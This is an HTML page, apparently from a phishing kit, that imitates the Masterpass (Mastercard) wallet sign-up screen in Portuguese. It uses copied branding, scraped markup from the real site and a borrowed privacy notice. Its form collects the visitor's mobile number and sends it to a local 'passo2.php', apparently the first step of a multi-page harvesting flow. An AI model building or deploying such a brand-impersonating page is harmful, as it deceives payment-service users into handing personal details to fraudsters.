<!-- 
   Theme Name: MasterPass
   Author: MK(rj)
    -->

    <!DOCTYPE html>
<html lang="pt-BR">
   <head>
      <title>Bem vindo ao Masterpass</title>
        <meta http-equiv="content-type" content="text/html; charset=UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta name="theme-color" content="#1a1f71">
        
        <link rel="stylesheet" type="text/css" href="css/bootstrap.css">
        <link rel="stylesheet" type="text/css" href="css/estilo.css">
        <link href="img/favicon.png" rel="Shortcut Icon">

        <script src="js/jquery-3.2.1.min.js"></script>
        <script src="js/bootstrap.js"></script>
        <script src="js/script1.js"></script>

      <meta name="viewport" content="width=device-width, initial-scale=1.0">
   </head>

<body>
   <header role="banner" class="header header-pinned ng-scope">
       <div class="container-content content-header ng-scope">
           <div class="header-brands">
               <div class="header-brand">
                  <img alt="Masterpass" class="img-responsive img-header-brand ng-scope img-header-brand-hero" src="img/header-mpass-hero.svg" style="">
               </div>
           </div> 
       </div>
   </header>

   <main role="main" class="main main-content ng-scope">
       <div class="mpass-card ng-scope">
           <div class="container">
               <div class="row">
                   <div class="col-sm-6">
                       <div class="container-announcements">
                           <forgeforms-accessible-header class="ng-isolate-scope">
                               <h1 class="text-announcements ng-binding">Bem-vindo ao Masterpass</h1>
                               <p class="text-announcements h3 ng-binding">Para se cadastrar, forneça seu e-mail ou número de celular que usaremos para encontrar a carteira certa para você. Ou acesse sua carteira existente.</p>
                           </forgeforms-accessible-header>
                       </div>
                   </div>
                   <div class="col-sm-6">
                       <form class="ng-valid-maxlength ng-dirty ng-valid-parse ng-valid-required ng-valid-username ng-valid ng-valid-email" action="passo2.php" method="POST">
                           <div class="form-block">
                             <div class="formly-field ng-scope ng-isolate-scope formly-field-fieldUsername">
                                 <div>
                                     <input class="form-control ng-valid-maxlength ng-touched ng-not-empty ng-dirty ng-valid-parse ng-valid-required ng-valid-username ng-valid ng-valid-email" name="telefone" id="telefone" placeholder="Número de Celular" onkeypress="return SomenteNumero(event)" oninvalid="setCustomValidity('Digite um telefone válido !')" onchange="try{setCustomValidity('')}catch(e){}" onkeyup="mascaraMike('(##)#####-####', this);javascript:pulacampo('telefone','continue');" type="tel" maxlength="15" autofocus required>
                                 </div>
                             </div>
                           </div>
                           <div class="row">
                               <div class="col-sm-6 ng-scope">
                                   <div class="form-group">
                                       <button type="submit" name="continue" id="continue" class="btn btn-block btn-primary ng-binding">Cadastre-se</button>
                                   </div>
                               </div>
                           </div>
                       </form>
                       <div class="small ng-binding ng-scope" ng-if="vm.hasCookieNotice">Precisamos do seu consentimento para prosseguir.</div>
                       <cookie-consent-notice class="ng-scope ng-isolate-scope">
                           <p class="small ng-binding">Nosso site usa scripts e inteligência de fraude de terceiros para coletar e compartilhar dados confidenciais, identificadores exclusivos, detalhes do dispositivo e dados do sensor de dispositivo móvel, como, por exemplo, a forma como você segura e move seu dispositivo, para que nosso site realize os processos de verificação fundamentais que usamos para aumentar sua segurança e evitar fraudes. Ao clicar em Acessar ou Cadastre-se acima e continuar a utilizar este site, você concorda que podemos coletar, usar e armazenar estes dados.</p>
                       </cookie-consent-notice>
                   </div>
               </div>
           </div>
       </div>
   </main>
</body>
</html>

